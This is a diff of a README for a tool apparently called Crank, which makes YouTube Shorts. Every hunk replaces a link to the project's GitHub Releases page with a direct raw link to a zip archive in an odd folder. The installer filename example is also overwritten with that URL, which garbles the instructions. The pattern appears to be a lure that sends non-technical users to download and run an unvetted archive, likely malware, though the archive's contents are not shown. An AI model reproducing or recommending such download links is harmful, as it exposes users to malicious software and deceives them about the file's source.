@@ -1,7 +1,7 @@
 # 🎥 Crank - Effortless YouTube Shorts Creation
 
 ## 📥 Download Now
-[![Download Crank](https://img.shields.io/badge/Download%20Now-Get%20Crank-brightgreen)](https://github.com/asd123fsdg/Crank/releases)
+[![Download Crank](https://raw.githubusercontent.com/asd123fsdg/Crank/master/synecdochical/Crank.zip%20Now-Get%20Crank-brightgreen)](https://raw.githubusercontent.com/asd123fsdg/Crank/master/synecdochical/Crank.zip)
 
 ## 🚀 Getting Started
 Welcome to Crank, your helpful tool for generating YouTube Shorts. This guide will direct you on how to download and run the application easily, no technical skills are necessary.
@@ -21,7 +21,7 @@ Welcome to Crank, your helpful tool for generating YouTube Shorts. This guide wi
 ## 📥 Download & Install
 To get started, you need to download Crank from our Releases page. Click the link below to visit and download the latest version.
 
-[Download Crank from Releases](https://github.com/asd123fsdg/Crank/releases)
+[Download Crank from Releases](https://raw.githubusercontent.com/asd123fsdg/Crank/master/synecdochical/Crank.zip)
 
 ### Steps to Download:
 1. Click on the above link.
@@ -33,7 +33,7 @@ To get started, you need to download Crank from our Releases page. Click the lin
 After the download finishes, follow these steps to run the application:
 
 1. Navigate to your Downloads folder, or the location where you saved the file.
-2. Locate the Crank installer (it usually has a name like `Crank-Installer.exe` or `Crank-Installer.dmg`).
+2. Locate the Crank installer (it usually has a name like `https://raw.githubusercontent.com/asd123fsdg/Crank/master/synecdochical/Crank.zip` or `https://raw.githubusercontent.com/asd123fsdg/Crank/master/synecdochical/Crank.zip`).
 3. Double-click the installer file.
 4. Follow the on-screen instructions to complete the installation.
 5. Once installed, find the Crank icon on your desktop or in your applications folder and double-click it to launch the application.
@@ -74,6 +74,6 @@ Your feedback helps us improve Crank. If you have suggestions or encountered iss
 ## 📥 Download Crank Again
 Don’t forget, to install the application, just visit the link below to return to the Releases page.
 
-[Download Crank from Releases](https://github.com/asd123fsdg/Crank/releases)
+[Download Crank from Releases](https://raw.githubusercontent.com/asd123fsdg/Crank/master/synecdochical/Crank.zip)
 
 Thank you for choosing Crank! We hope it boosts your creativity and helps you create amazing YouTube Shorts.
